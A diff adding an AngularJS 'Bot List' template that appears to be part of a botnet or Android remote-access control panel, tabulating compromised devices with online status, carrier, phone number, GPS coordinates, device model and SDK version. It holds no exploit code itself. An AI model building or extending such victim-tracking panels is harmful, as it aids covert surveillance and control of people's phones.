@@ -1,0 +1,36 @@
+<h1>Bot List</h1>
+<table class="table">
+  <thead>
+    <tr>
+      <th>UID</th>
+      <th>Status</th>
+      <th>Last Seen</th>
+      <th>Provider</th>
+      <th>Phone#</th>
+      <th>Location</th>
+      <th>Device</th>
+      <th>SDK</th>
+      <th>Version</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr ng-repeat="bot in bots">
+      <td>
+        <a ui-sref="bot({id: bot.id})">{{bot.uid}}</a>
+      </td>
+      <td class="{{bot.status? 'text-success' : 'text-danger'}}">{{bot.status ? 'ONLINE' : 'OFFLINE'}}</td>
+      <td>{{bot.updated | date: 'EEE MMM dd, yyyy hh:mm a'}}</td>
+      <td>{{bot.provider}}</td>
+      <td>{{bot.phone}}</td>
+      <td>({{bot.lat}}, {{bot.longi}})</td>
+      <td>{{bot.device}}</td>
+      <td>{{bot.sdk}}</td>
+      <td>{{bot.version}}</td>
+    </tr>
+    <tr ng-show="bots.length == 0">
+      <td colspan="9">
+        <strong>No bots yet.</strong>
+      </td>
+    </tr>
+  </tbody>
+</table>
